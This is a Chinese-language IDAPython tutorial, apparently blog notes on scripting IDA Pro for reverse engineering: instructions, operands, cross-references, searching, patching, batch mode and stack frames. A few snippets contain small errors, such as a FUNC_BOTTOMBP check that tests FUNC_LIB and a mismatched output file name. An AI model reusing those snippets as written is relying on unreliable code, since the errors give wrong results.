**idc.next_head(curr_addr,end)**返回处于curr_addr和end之间的下一条指令的地址,如果没有指令则返回idc.BADADDR.这种方法的一个缺陷是它依赖于指令被包含在函数开始和结束的边界内.打个比方说,函数内有个jmp指令,它跳转到比这个函数结束地址还要高的地址中去,意思是这个函数的所有指令可能并不是线性的,它可能会通过jmp跳出函数边界(起始地址和结束地址),但其实这段指令仍是属于这个函数的,那么我们使用上述的方法就不能够遍历到该函数要执行的所有指令.这种跳转在代码混淆中非常的常见,所以说我们最好还是使用idautils.FuncItems(ea)来循环函数内的指令. import idc import idautils import idaapi items = idautils.FuncItems(idc.here()) for item in items: print(hex(item),idc.GetDisasm(item)) 获取ea地址的上一条指令的地址: idc.prev_head(ea) 关于函数的详细信息有如下几个函数: #可在idc_bc695.py中查看 def GetFrame(ea): return get_func_attr(ea, FUNCATTR_FRAME) def GetFrameLvarSize(ea): return get_func_attr(ea, FUNCATTR_FRSIZE) def GetFrameRegsSize(ea): return get_func_attr(ea, FUNCATTR_FRREGS) def GetFrameArgsSize(ea): return get_func_attr(ea, FUNCATTR_ARGSIZE) def GetFunctionFlags(ea): return get_func_attr(ea, FUNCATTR_FLAGS) 例如用如下代码获取函数的标志: import idc import idautils import idaapi for func in idautils.Functions(): flags = idc.get_func_attr(func, idc.FUNCATTR_FLAGS) if flags \u0026 idc.FUNC_NORET: print(hex(func), \"FUNC_NORET\") if flags \u0026 idc.FUNC_FAR: print(hex(func), \"FUNC_FAR\") if flags \u0026 idc.FUNC_LIB: print(hex(func), \"FUNC_LIB\") if flags \u0026 idc.FUNC_STATIC: print(hex(func), \"FUNC_STATIC\") if flags \u0026 idc.FUNC_FRAME: print(hex(func), \"FUNC_FRAME\") if flags \u0026 idc.FUNC_USERFAR: print(hex(func), \"FUNC_USERFAR\") if flags \u0026 idc.FUNC_HIDDEN: print(hex(func), \"FUNC_HIDDEN\") if flags \u0026 idc.FUNC_THUNK: print(hex(func), \"FUNC_THUNK\") if flags \u0026 idc.FUNC_LIB: print(hex(func), \"FUNC_BOTTOMBP\") 各种标志的含义如下: FUNC_NORET: 这个标志表示某个函数是否有返回值. FUNC_FAR: 这个标志非常少的出现,标志程序是否使用分段内存. FUNC_USERFAR: 这个标志也非常少见,也很少有文档,HexRays把它描述为“user has specified far-ness of the function”. FUNC_LIB: 这个表示用于寻找库函数的代码.识别库函数代码是非常有必要的,因为我们在分析的 时候一般将其跳过.下面的例子展示了如何使用这个标志. for func in idautils.Functions(): flags = idc.get_func_attr(func, FUNCATTR_FLAGS) if flags \u0026 FUNC_LIB: print(hex(func), \"FUNC_LIB\",get_func_name(func)) FUNC_STATIC: 这个标志作用在于识别该函数在编译的是否是一个静态函数.在C语言中静态函数被默认为是全局的.如果作者把这个函数定义为静态函数,那么这个函数只能被本文件中的函数访问.利用静态函数的判定我们可以更好的理解源代码的结构. FUNC_FRAME: 这个标志表示函数是否使用了ebp寄存器(帧指针),使用ebp寄存器的函数通常有如下的语法设定,目的是为了保存栈帧. .text:00404C90 push ebp .text:00404C91 mov ebp, esp .text:00404C96 s","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:6:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"指令 如果我们拥有一个函数中的指令地址,我们可以使用idautils.FuncItems(ea)来获取该函数中所有指令地址的集合. import idc import idautils import idaapi items = idautils.FuncItems(idc.here()) for item in items: print(hex(item),idc.GetDisasm(item)) 获取ea这个地址所在函数的所有指令的地址: idautils.FuncItems(ea) #返回一个迭代器 现在我们已经完全掌握了如何循环遍历程序中的段,函数和指令,那我们就开始 show 一个非常有用的例子.有时候我们会逆向一段加壳的代码,这时知道代码中哪里进行了动态调用对分析是非常有帮助的.一个动态的调用可能是由 call 或者 jmp 加上一个操作数来实现的,比如说 call eax或者 jmp edi. import idc import idautils import idaapi for func in idautils.Functions(): flags = idc.get_func_attr(func, idc.FUNCATTR_FLAGS) if flags \u0026 idc.FUNC_LIB or flags \u0026 idc.FUNC_THUNK: continue dism_addr = idautils.FuncItems(func) for line in dism_addr: m = idc.print_insn_mnem(line) if m == \"call\" or m == \"jmp\": op = idc.get_operand_type(line,0) if op == idc.o_reg: print(hex(line),idc.GetDisasm(line)) 获取操作数类型: get_operand_type(ea,n) #n=0表示第一个操作数,n=1表示第二个操作数. 获取当前指令的下一个指令的地址和上一个指令的地址: idc.next_head(idc.here()) idc.prev_head(idc.here()) #这两个函数的功能获取的是下一条指令的地址而不是下一个地址 获取下一个地址或者上一个: idc.next_addr(idc.here()) idc.prev_addr(idc.here()) 区别如下: .text:005772A9 add esi, 4 .text:005772AC cmp esi, offset unk_5D53BC Python\u003eidc.next_head(0x005772A9) 0x5772ac Python\u003eidc.next_addr(0x005772A9) 0x5772aa ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:7:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"操作数 操作数在逆向分析中经常被使用,所以说了解所有的操作数类型对逆向分析是非常有帮助的.在前面文中提到我们可以使用**idc.get_operand_type(ea,n)**来获取操作数类型,ea 是一个地址,n 是一个索引.操作数总共有八种不同的类型. o_void: 如果指令没有任何操作数,它将返回 0. o_reg: 如果操作数是寄存器,则返回这种类型,它的值为 1. o_mem: 如果操作数是直接寻址的内存,那么返回这种类型,它的值是 2,这种类型对寻找DATA的引用非常有帮助. Python\u003eprint(hex(idc.here()), idc.GetDisasm(idc.here())) 0x40f576 cmp dword_5D0E44, edi Python\u003eidc.GetOpType(idc.here(),0) 0x2 o_phrase: 如果操作数是利用基址寄存器和变址寄存器的寻址操作的话,那么返回该类型,值为3. Python\u003eprint(hex(idc.here()), idc.GetDisasm(idc.here())) 0x1000b8c2 mov [edi+ecx], eax Python\u003eidc.GetOpType(idc.here(),0) 0x3 o_displ: 如果操作数是利用寄存器和位移的寻址操作的话,返回该类型,值为4,位移指的是像如下代码中的 0x18,这在获取结构体中的某个数据是非常常见的. Python\u003eprint(hex(idc.here()), idc.GetDisasm(idc.here())) 0x40f6ec mov ebx, [ebp+0Ch] Python\u003eidc.GetOpType(idc.here(),1) 0x4 o_imm: 如果操作数是一个确定的数值的话,那么返回类型,值为5. ------------------------------------------- Python\u003eprint(hex(idc.here()), idc.GetDisasm(idc.here())) 0xa05da1 add esp, 0Ch Python\u003eidc.GetOpType(idc.here(),1) 0x5 ------------------------------------------- o_far: 这种返回类型在x86 和 x86_64的逆向中不常见.它用来判断直接访问远端地址的操作数,值为6. o_near: 这种返回类型在x86和x86_64的逆向中不常见.它用来判断直接访问近端地址的操作数,值为7. ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:8:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"例子1 当我们在逆向一个可执行文件的时候,我们可能会注意到一些代码会不断的重复使用某个偏移量.这种操作感觉上是代码在传递某个结构体给不同的函数使用.接下来的这个例子的目的是创建一个python的字典,字典包含了可执行文件中使用的所有偏移量,让偏移量作为字典的key,而每个key对应的value存储着所有使用该偏移量的地址. import idc import idautils import idaapi from collections import defaultdict displace = defaultdict(list) for func in idautils.Functions(): flags = idc.get_func_attr(func, idc.FUNCATTR_FLAGS) if flags \u0026 idc.FUNC_LIB or flags \u0026 idc.FUNC_THUNK: continue dism_addr = idautils.FuncItems(func) for line in dism_addr: op = None index = None # 定义结果结构来解析当前的指令 tmp = idaapi.insn_t() idaapi.decode_insn(tmp,line) if tmp.Op1.type == idaapi.o_displ: op = 1 if tmp.Op2.type == idaapi.o_displ: op = 2 if op == None: continue if \"bp\" in idc.print_operand(line,0) or \"bp\" in idc.print_operand(line,1): if op == 1: index = (~(int(tmp.Op1.addr) - 1) \u0026 0xFFFFFFFF) else: index = (~(int(tmp.Op2.addr) - 1) \u0026 0xFFFFFFFF) else: if op ==1 : index = int(tmp.Op1.addr) else: index = int(tmp.Op2.addr) if index: displace[index].append( hex(line) ) print(displace) idaapi.decode_insn(tmp,line)是解析指令的另一种底层的方法. 我们已经获取了操作符的字符串表示,那么我们检查操作符中是否包含了“bp”字符串,这是一个快速判断操作符的中寄存器是否为bp,ebp或者rbp的方法.检查”bp”字符串的目的在于确定偏移量是否是一个负数.我们使用idaapi.cmd.Op1.addr来获取偏移量,这个方法会返回一个字符串.然后我们把他转换成为一个 integer类型,如果需要的话把它转换为正数,然后我们把它放进脚本最开始定义的字典display中去.这样就完成了我们的操作,之后如果你想要查找使用某个偏移量的所有地址,直接读取就可以了. ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:8:1","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"例子2 有时候我们在逆向分析一个可执行文件的内存转储的时候,有些操作数就不是一个偏移量了.看如下代码: push 0Ch push 0BC10B8h push [esp+10h+arg_0] call ds:_strnicmp 第二个被push的值是一个存在内存中的偏移.如果我们通过右键把这个偏移定义为data类型,我们可以看到这个偏移其实是一个字符串,当然完成这个定义操作很简单,但是,有时候这种操作太多了话就需要写一个脚本来自动完成这件事情. import idc import idautils import idaapi from collections import defaultdict min = idc.get_inf_attr(idc.INF_MIN_EA) max = idc.get_inf_attr(idc.INF_MAX_EA) # for each known function for func in idautils.Functions(): flags = idc.get_func_attr(func, idc.FUNCATTR_FLAGS) # skip library \u0026 thunk functions if flags \u0026 idc.FUNC_LIB or flags \u0026 idc.FUNC_THUNK: continue dism_addr = list(idautils.FuncItems(func)) for curr_addr in dism_addr: if idc.get_operand_type(curr_addr, 0) == 5 and \\ (min \u003c idc.get_operand_value(curr_addr,0) \u003c max): idc.op_plain_offset(curr_addr, 0, 0) # print(hex(curr_addr)) if idc.get_operand_type(curr_addr, 1) == 5 and (min \u003c idc.get_operand_value(curr_addr,1) \u003c max): idc.op_plain_offset(curr_addr, 1, 0) # print( hex(curr_addr) ) 获取操作数的值: idc.get_operand_value(ea, n) 将操作数转换为一个偏移地址: idc.op_plain_offset(ea, n, base) #参数一:ea为地址. #参数二:n为操作数的索引. #参数三:是基地址,该例子中只需要设置为0即可. ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:8:2","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"交叉引用(Xrefs) 能够定位data段和code段的交叉引用非常重要,交叉引用的重要性在于它能够提供某个确定的数据或者某个函数被调用的位置.举个例子,如果我们想要知道哪些地址调用了WriteFile()函数,我们所要做的就是在导入表中找到 WriteFile()函数,然后查看其交叉引用即可. import idc import idautils import idaapi from collections import defaultdict addr = idc.get_name_ea_simple(\"WriteFile\") print(idc.GetDisasm(addr)) for i in idautils.CodeRefsTo(addr, 0): print(hex(i), idc.GetDisasm(i)) 获取API函数的地址: idc.get_name_ea_simple(\"WriteFile\") 获取该API的所有交叉引用: idautils.CodeRefsTo(ea,flow) #参数一:ea是我们想要寻找交叉引用的地址. #参数二:flow是一个bool值,它用于指定是否遵循正常的代码流. 但有一点要注意:使用idautils.CodeRefsTo(ea，flow)的限制是,动态导入并手动重命名的API不会 显示为代码交叉引用.比如下面我们利用idc.MakeName(ea,name)将一个dword的地址重命名为\"RtlCompareMemory\". import idc import idautils import idaapi ea = idc.here() idc.MakeName(ea, \"RtlCompareMemory\") IDA并不会将这些API标记为交叉引用代码,稍后我们将会使用一个通用的技术来获得所有的交叉引用. 获取在IDA中任何API和被重命名的函数的相关信息: idautils.Names() #返回一个类型为(ea, str_name)的元组. 获取任意地址所引用的代码: idautisl.CodeRefsFrom(ea,flow) 下面的例子展示获取某地址的引用信息. import idc import idautils import idaapi addr = idc.here() for i in idautils.CodeRefsFrom(addr,0): print(hex(i),idc.GetDisasm(i)) 查找数据的交叉引用或者调用: idautils.DataRefsTo(ea) #返回该数据地址的所有交叉引用(迭代器) idautils.DataRefsFrom(ea) #返回该地址所引用的数据地址 在查找数据和代码的交叉引用的时候可能会有一些困惑,这里我们使用前面所提到的有一种更加通用的方法来获取交叉引用,该方法调用两个函数就能完成获取所有交叉引用地址和调用地址的效果,这两个函数就是 idautils.XrefsTo(ea,flags=0)和idautils.XrefsFrom(ea,flags=0). import idc import idautils import idaapi addr = idc.here() print(hex(addr),idc.GetDisasm(addr)) for xref in idautils.XrefsTo(addr,1): print(xref.type,idautils.XrefTypeName(xref.type),hex(xref.frm),hex(xref.to),xref.iscode) idautils.XrefsTo(ea,flags=0) #idc.ida_xref.XREF_ALL=0 (default) #idc.ida_xref.XREF_FAR=1 #idc.ida_xref.XREF_DATA=2 xref.type来指明该交叉引用的类型. **idautils.XrefTypeName(xref.t ype)**用来打印表示该类型的含义,这其中有十二种不同的类型. #可在idautils.py文件中查看 _ref_types = { ida_xref.fl_U : 'Data_Unknown', ida_xref.dr_O : 'Data_Offset', ida_xref.dr_W : 'Data_Write', ida_xref.dr_R : 'Data_Read', ida_xref.dr_T : 'Data_Text', ida_xref.dr_I : 'Data_Informational', ida_xref.fl_CF : 'Code_Far_Call', ida_xref.fl_CN : 'Code_Near_Call', ida_xref.fl_JF : 'Code_Far_Jump', ida_xref.fl_JN : 'Code_Near_Jump', 20 : 'Code_User', ida_xref.fl_F : 'Ordinary_Flow' } xref.frm 打印出该地址的交叉引用. xref.to 打印出该地址本身. xref.iscode 打印出该交叉引用是否在代码段中. 上述的代码我们使用了idautils.XrefsTo(ea, 1)并将其flag位设为了1,如果我们将flag设为0,那么它将会显示该地址的任意交叉引用.设置flag为0获取的交叉引用不只是来自于分支跳转指令,同时还会来自正常的指令流程,设置flag为1可以略过正常指令流程造成的交叉引用. ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:9:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"搜索 我们其实已经能够通过遍历所有已知的函数及其指令来达到一种基本的搜索效果,这当然很有用,但是有时候我们需要搜索一些特定的字节,比如说 0x55,0x8b,0xec 这种字节序列,这3个字节其实代表的汇编代码为 push ebp, mov ebp, esp.所以我们可以使用**idc.find_binary(ea,flag,searchstr,radix=16)**来进行字节或者二进制的搜索. ea代表啥就不说了,flag代表搜索方向或者条件.flag有好几种不同的类型： #可在idc.py中查看 SEARCH_UP = 0 SEARCH_DOWN = 1 SEARCH_NEXT = 2 SEARCH_CASE = 4 SEARCH_REGEX = 8 SEARCH_NOBRK = 16 SEARCH_NOSHOW = 32 上面的类型不必要都看一遍,但是还是要看看一些常用的类型: SEARCH_UP 和SEARCH_DOWN 用来指明搜索的方向. SEARCH_NEXT 用来获取下一个已经找到的对象 SEARCH_CASE 用来指明是否区分大小写 SEARCH_NOSHOW 用来指明是否显示搜索的进度 searchstr 是我们要查找的内容,radix 参数在写处理器模块时使用,这超出本书要讲解的范围,所以我推荐你去看一看 Chris Eagle 的“The IDA Pro Book”的第 19 章,所以这里我们把radix参数留空.现在让我们来实现刚才提到的那三个字节的搜索好了: #这是一个错误示例 地址并没有增加 import idc import idautils import idaapi pattern = \"55 8B EC\" addr = idc.get_inf_attr(idc.INF_MIN_EA) for x in range(0,5): addr = idc.find_binary(addr,idc.SEARCH_DOWN,pattern) if addr!= idc.BADADDR: print(hex(addr),idc.GetDisasm(addr)) 第一行我们定义了要搜索的形式,搜索形式可以是16进制格式,比如 0x55 0x8B 0xEC和 55 8B EC都是可以的,\\x55\\x8B\\xEC 这种格式可不行,除非你使用idc.find_text(ea, flag,y, x, searchstr)这个函数. 但是我们搜索的时候,地址并没有增长,那是因为我们写程序的时候没有增加SEARCH_NEXT这个标记.正确的写法如下: import idc import idautils import idaapi pattern = \"55 8B EC\" addr = idc.get_inf_attr(idc.INF_MIN_EA) for x in range(0,5): addr = idc.find_binary(addr,idc.SEARCH_DOWN | idc.SEARCH_NEXT,pattern) if addr!= idc.BADADDR: print(hex(addr),idc.GetDisasm(addr)) 搜索字符串: idc.find_text(ea, flag, y, x, searchstr, from_bc695=False) #参数一:ea是地址. #参数二:flag是搜索方向和搜索类型. #参数三:y是从ea开始搜索的行数,通常置0. #参数四:x是行中的坐标,通常置0. #参数五:searchstr是要搜索的字符串. 现在我们开始查找字符串“NoRun”的出现的次数.当然你可以换换其他的字符串,可以从字符串窗口(shift+F12)获得. import idc import idautils import idaapi addr = idc.get_inf_attr(idc.INF_MIN_EA) end = idc.get_inf_attr(idc.INF_MAX_EA) while addr \u003c end: addr = idc.find_text(addr, idc.SEARCH_DOWN, 0, 0, \"NoRun\") if addr == idc.BADADDR: break else: print(hex(addr), idc.GetDisasm(addr)) addr = idc.next_head(addr) 因为我们利用了idc.NextHead(ea)使当前地址不断增长,所以就不需要在idc. FindText()中添加 SEARCH_NEXT的标志.为什么我们要手动的增加地址呢,因为一行字符串中可能出现多次要查找的字符串,往上翻认真阅读 SEARCH_NEXT的标志的意思. 判断一个地址的类型: #下述这些api返回bool值,true或者false. idc.is_code(f) # 判断是否是代码. idc.is_data(f) # 判断是否是数据. idc.is_tail(f) # 判断 IDA 是否将其判定为尾部. idc.is_unknown(f) # 判断 IDA 是否将其判定为未知,即既不是数据,也不是代码. idc.is_head(f) # 判断 IDA 是否将其判定为头部. f这个参数是新出现的,相比起于传递地址,我们还要先通过idc.get_full_flags(ea)获取地址的内部标志表示,然后再传给idc.is系列函数当参数,代码如下: import idc import idautils import idaapi ea = idc.here() f = idc.get_full_flags(ea) print(idc.isCode(f)) 寻找被标志为代码的下一个地址: idc.find_code(ea,flag) 上述API我们想要查找数据块的末尾是很有帮助的.如果ea是代码地址,那么上述函数返回下一个代码地址,flag参数看前面的idc.find_text就可以了. .text:00577821 push 0 .text:00577823 mov eax, offset loc_56B690 Python\u003eidc.find_code(0x00577821, idc.SEARCH_DOWN | idc.SEARCH_NEXT) 0x577823 这个函数会跳过一些数据段的地址,得到最近的一个代码段的首地址. **idc.find_data(ea,flag)**和上面的find_code函数差不多,不过它返回的是数据段的地址. **idc.find_unknown(ea,flag)**该功能用于查找IDA未识别为代码或数据的字节地址,未知类型需要通过观察或脚本进一步手动分析. **idc.find_defined(ea, flag)**它用于查找IDA标识为代码或数据的地址. **idc.find_imm(ea, flag, value)**用来寻找立即数.例如:相比于寻找一些类型,我们有些时候其实更希望能够找到特定的值,举个例子,你感觉代码里面肯定是用了 rand()函数来产生随机数的,但是你就是找不到它,咋办? 如果我们知道这个 rand()函数采用了0x343fd作为种子那么我们就可以去寻找这个值. ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:10:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"数据提取 获取用户鼠标选中部分的起始和结束地址: idc.read_selection_start() idc.read_selection_end() 注意idc.read_selection_end()获取的的并不是选中部分代码的末尾地址,而是选中部分的最后一条指令的下一条指令的起始地址. 函数idaapi.read_selection()也可以实现上面的效果. import idc import idautils import idaapi p0 = idaapi.twinpos_t() p1 = idaapi.twinpos_t() view = idaapi.get_current_viewer() idaapi.read_selection(view, p0, p1) print(\"start:\", hex(p0.place(view).ea)) print(\"end:\", hex(p1.place(view).ea)) #注意此处,hex(p1.place(view).ea)是选中部分的最后一条指令的地址 ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:11:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"注释和重命名 注释一共有两种: 常规注释 重复性注释 重复性注释会因为某些地址引用了当前地址的内容,而会自动添加上注释. 添加注释: idc.set_cmt(ea, cmt, 0) 添加重复性注释: idc.set_cmt(ea, cmt, 1) 获取常规注释: idc.get_cmt(ea, 0) 获取重复性注释: idc.get_cmt(ea, 1) 函数添加获取注释: idc.set_func_cmt(ea, cmt, repeatable) #参数一:ea可以是函数中的任何地址 #参数二:cmt就是我们要添加的注释 #参数三:repeatable是否为重复性注释 #将函数的注释标记为可重复性的话,那么它会在任何调用该函数的地方添加注释 idc.get_func_cmt(ea, repeatable) 重命名某个地址的函数: #可在idc_bc695.py文件中查看 idc.MakeName(ea, name) idc.MakeNameEx(ea, name, flags) 值得注意的是使用idc.MakeName的话,如果某一个函数名称已经被使用了,那么ida会抛出一个警告的对话.为了跳过该对话框,我们使用idc.MakeNameEx,将flag的值设置为256或者SN_NOWARN即可. ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:12:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"访问原始数据 在逆向工程中获取原始数据是非常重要的,原始数据是16进制的字节,它们被解释为数据或代码,ida中我们可以在反汇编窗口的左侧可以看到这些原始数据.(IDA中显示的设置方法:菜单栏–\u003e选项–\u003e常规–\u003e反汇编–\u003e机器码字节数，填入一个数就ok了–\u003e确定). 获取指定地址数据: idc.get_wide_byte(ea) #获取1字节 idc.get_wide_word(ea) #获取2字节 idc.get_wide_dword(ea) #获取4字节 idc.get_qword(ea) #获取8字节 idc.GetFloat(ea) idc.GetDouble(ea) 获取指定地址指定字节数: idc.get_bytes(ea, size, use_dbg = False) #返回bytes类型 ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:13:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"补丁 有时候我们在逆向一个恶意软件的时候,样本会有被加密的字符串.这会阻碍我们分析的过程和阻止我们通过字符串来定位关键点.这种情况下给idb文件打补丁就很有用了. Patch相关函数: patch_byte(ea, value) patch_word(ea, value) patch_dword(ea, value) patch_qword(ea, value) ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:14:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"输入输出 在IDAPython中,当我们并不知道文件的位置或者并不知道用户想要把他们的数据存储在什么地方,输入输出文件就很重要了. ida_kernwin.ask_file(for_saving, mask, prompt) #参数一:forsave 0,打开一个文件对话框;1,打开一个文件保存对话框. #参数二:mask用来指定文件后缀或者模式,如:\"*.dll\". #参数三:prompt 窗口的名字. ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:15:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"批生成文件 有时,为目录中的所有文件创建IDB或ASM可能很有用.在分析属于同一系列恶意软件的一组样本时,这可以帮助节省时间,比起手工做这件事情,写一个批处理文件会容易许多,我们只需要将-B 该参数传给 idat.exe即可.下面的代码可以被复制到包含我们想为其生成文件的所有文件的目录中. D:/LuoHackTools/Tools/Disassemblers/IDA_Pro_v7.5/idat.exe -B ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:16:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"可执行脚本 IDAPython脚本可以在命令行中执行,我们也可以使用下面计算IDB拥有指令个数的脚本,然后将其个数写进一个叫做“instru_count.txt”文件中. import idc import idautils import idaapi idaapi.auto_wait() count = 0 for func in idautils.Functions(): flags = idc.get_func_attr(func, idc.FUNCATTR_FLAGS) if flags \u0026 idc.FUNC_LIB: continue for instru in idautils.FuncItems(func): count += 1 f = open(\"instru_count.t\",'w') writeContent = \"Instruction count is {}\".format(count) print(writeContent) f.write(writeContent) f.close() idc.qexit(0) 上面两个十分重要的函数,一个是idaapi.auto_wait(),一个是idc.qexit(0),当ida打开一个文件的时候,等待IDA分析完成是很重要的,因为IDA分析一个文件需要花大量的时间.这时候你不能执行 IDAPython 脚本,所以你可使用idaapi.auto_wait()来等待IDA文件分析结束,它会在IDA分析完成之前一直等待,一旦分析完成,控制权就会交到脚本身上.然后我们同样需要使用idc.qexit(0)来结束脚本的执行,如果不这么做的话,IDB可以会在关闭的时候出问题. ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:17:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"流程图 使用IDAPython生成CFG图. import idc import idautils import idaapi def cls_main(p=True): f = idaapi.FlowChart(idaapi.get_func(idc.here())) for block in f: if p: print(\"%x- %x[%d]:\" % (block.start_ea, block.end_ea, block.id)) for succ_block in block.succs(): # 获取后继节点 if p: print(\" succs: %x- %x[%d]:\" % (succ_block.start_ea, succ_block.end_ea, succ_block.id)) for pred_block in block.preds(): # 获取前驱节点 if p: print(\" preds:%x- %x[%d]:\" % (pred_block.start_ea, pred_block.end_ea, pred_block.id)) cls_main() ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:18:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"函数栈帧的访问 在x86程序中,EBP寄存器通常专门用做栈帧指针,例外gun/g++提供 -fomit-frame-pointer编译选项,可以生成不依赖于固定帧指针寄存器的函数. 基于ebp做栈帧指针的函数,正偏移是函数参数,负偏移是则用于访问函数的局部变量. 很明显函数的栈帧是一个运行时的概念,没有栈和运行时的程序,栈帧就不可能存在.话虽如此,但是并不意味者ida在做静态的分析的时候就会忽略掉栈帧的概念.二进制文件中包含配置每个函数栈帧所需的所有代码,通过仔细分析这些代码,我们就可以深入了解任何函数的栈帧结构,即使这个函数并未运行.在IDA中也会有一些复杂的分析来确定IDA反汇编的每个函数的栈帧布局.在分析的过程中,IDA会记住每一次push/pop操作,以及其他的任何可能改变栈指针的运算,如增加或者减去常量,尽可能的去观察栈指针在函数执行时的行为. IDA提供一个摘要视图,列出了栈帧内被直接引用的每一个变量,以及变量的大小和与它们与帧指针的偏移距离. .text:005680D7 ; int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) .text:005680D7 _WinMain@16 proc near ; CODE XREF: __scrt_common_main_seh(void)+F3↑p .text:005680D7 .text:005680D7 var_4 = dword ptr -4 .text:005680D7 hInstance = dword ptr 8 .text:005680D7 hPrevInstance = dword ptr 0Ch .text:005680D7 lpCmdLine = dword ptr 10h .text:005680D7 nShowCmd = dword ptr 14h idapython也提供获取此函数栈帧的api,获取到之后是一个结构体,操作结构体成员就可以获取到函数栈帧内的所有变量.相关的函数说明如下: idaapi.get_func(ea): retrieves the func_t structure for the function at ea. idaapi.get_frame(func_t foo): returns the struct_t structure for the function frame specified by foo. idautils.DecodeInstruction(ea): returns the inst_t representing instruction at ea,和函数idaapi.decode_insn功能相同. idaapi.get_stkvar(op_t op, sval_t v): op is a reference to an instruction, v is the immediate value in the operand. Usually you just use op.addr. It returns a tuple, (member_t, val). member_t is a pointer to the stack variable, which is what we need. val is the same value as the soff field in the member_t for the stack var. More on this later. idaapi.xreflist_t(): creates a new xreflist of xreflist_entry_t. idaapi.build_stkvar_xrefs(xreflist_t xrefs, func_t func, member_t member): fills xrefs with xreflist_entry_t‘s that represent the stack var xrefs given by member in func. struct_t.get_member(x): You can use this method to iterate all stack variables in a frame to retrieve all member_t‘s. If you want to build xrefs for all stack variables, this is usually easier. idc.get_member_name(id, member_offset): id is the struct sid，member_offset. get the member name defined in the name. idc.get_member_offset(id,name)：Get offset. 下面对iautils.DecodeInstruction(ea)指令进行一个简单的说明,这是一个指令解码的API,如果解码失败返回None,否则将返回一个包含该指令及其操作数的指令对象. 比较重要的指令属性如下: inst.itype:标志当前指令的类型,是一个整数,不同的opcode可能有相同的itype,但是opcode不是itype. inst.size:表示解码后的指令长度. inst.ops[]:以0为索引的数组,用来保存操作数的相关信息. inst.Op1…inst.OpN:以1位索引起始操作数组别名,和inst.ops[n+1]等价. inst.ea:指令的线性地址. 你可能会想知道opcode和它的itype之间到底是什么关系.其实很简单,在IDA中,开源数据库处理器模块负责根据opcode来填充itype字段.在IDA SDK中,你可以找到一个allins.hpp的头文件.该头文件包含了所有支持的处理器模块的枚举数据其中包含了受支持的所有指令: // allins.hpp // x86/x64 itypes enum { NN_null = 0, // Unknown Operation NN_aaa, // ASCII Adjust after Addition NN_aad, // ASCII Adjust AX before Division NN_aam, // ASCII Adjust AX after Multiply NN_aas, // ASCII Adjust AL after Subtraction . . . NN_jz, // Jump if Zero (ZF=1) NN_jmp, // Jump NN_jmpfi, // Indirect Far Jump NN_jmpni, // Indirect Near Jump NN_jmpshort, // Jump Short (not used) NN_lahf, // Load Flags into AH Register . . . // Pentium III Pseudo instructions NN_cmpeqps, // Packed Single-FP Compare EQ NN_cmpltps, // Packed Single-FP Compare LT NN_cmpleps, // Packed Single-FP Compare LE NN_cmpunordps, // Packed Single-FP Compare UNORD . . . } 不知道为什么,反正NN_前缀用来表示x86/x64处理器上的指令. # .text:00568113 jz short loc_56812E inst = idautils.DecodeInstruction(0x00568113) print(\"YES\" if inst.itype == idaapi.NN_jz else \"NO\") 